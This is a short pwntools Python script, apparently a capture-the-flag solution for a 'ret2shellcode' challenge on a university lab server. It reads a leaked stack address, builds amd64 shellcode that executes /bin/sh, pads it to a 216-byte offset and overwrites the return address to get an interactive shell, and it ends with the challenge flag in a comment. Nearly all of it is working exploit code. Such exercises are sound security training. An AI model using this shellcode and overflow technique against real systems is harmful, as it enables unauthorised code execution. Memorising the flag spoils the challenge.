from pwn import *

local = False
elf = 'ret2shellcode'

if local:
    context.binary = './' + elf
    r = process( './' + elf )
else:
    ip = "sqlab.zongyuan.nctu.me"
    port = 6002
    r = remote(ip, port)

context.arch = 'amd64'

SHELLCODE = '''
    xor     r8,r8
    mov     r8,0x68732f6e69622f
    push    r8
    xor     rax, rax
    mov     rax, 0x3b
    xor     rdi, rdi
    mov     rdi, rsp
    xor     rsi, rsi
    xor     rdx, rdx
    syscall
'''

r.recvuntil(': ')
addr = r.recv(14)
addr = p64( int(addr,16) )
shellcode = asm(SHELLCODE)
offset = 216 - len(shellcode)
# len(shellcode + 'A'*offset) = 216
payload = shellcode + 'A'*offset + addr

r.recvuntil(':')
r.sendline(payload)
r.interactive()

# balqs{system_bin_sh?}
